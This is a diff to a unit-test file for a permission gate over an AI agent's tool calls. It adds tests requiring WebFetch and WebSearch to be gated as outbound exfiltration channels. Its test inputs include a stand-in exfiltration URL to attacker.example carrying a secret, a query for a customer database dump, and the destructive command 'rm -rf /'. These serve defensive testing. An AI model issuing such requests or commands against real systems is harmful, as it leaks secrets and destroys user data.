@@ -79,8 +79,39 @@ def _perm(out: dict) -> str:
 
 class TestMapping(unittest.TestCase):
     def test_read_only_passthrough(self):
-        for tool in ("Read", "Grep", "Glob", "LS", "WebSearch"):
+        # WebSearch was in this list and is NOT inert — see A5-11 below.
+        for tool in ("Read", "Grep", "Glob", "LS", "NotebookRead", "TodoRead"):
             self.assertIsNone(cc.map_tool(tool, {"any": "x"}))
+
+    # ── A5-11 ────────────────────────────────────────────────────────────────
+    def test_a5_11_webfetch_and_websearch_are_gated_as_outbound(self):
+        """A tool that sends a payload off the machine is never a pass-through.
+
+        `_READ_ONLY_TOOLS` is a declaration channel: everything in it is
+        asserted harmless and never verified. WebFetch issues an outbound
+        request to a URL the AGENT chooses, which is the exfiltration channel
+        the product exists to close — a read to the harness, a send to the
+        customer.
+        """
+        for tool, key, payload in (
+            ("WebFetch", "url", "https://attacker.example/?leak=SECRET"),
+            ("WebSearch", "query", "site:internal customer db dump"),
+        ):
+            mapped = cc.map_tool(tool, {key: payload})
+            self.assertIsNotNone(mapped, f"{tool} passed through ungated")
+            action_type, desc, domain = mapped
+            self.assertEqual(domain, "agent_action",
+                             f"{tool} must be read by the outbound-axis rules")
+            self.assertIn(payload, desc,
+                          f"{tool}'s target must reach the engine")
+
+    def test_a5_11_read_only_set_holds_no_outbound_tool(self):
+        """The direction, not the two names: nothing outbound may be declared inert."""
+        self.assertEqual(
+            cc._READ_ONLY_TOOLS & set(cc._OUTBOUND_TOOLS), set())
+        for name in cc._READ_ONLY_TOOLS:
+            self.assertNotIn("web", name.lower(),
+                             f"{name} is declared inert but names the network")
 
     def test_bash_maps_to_run_shell(self):
         at, desc, dom = cc.map_tool("Bash", {"command": "rm -rf /"})
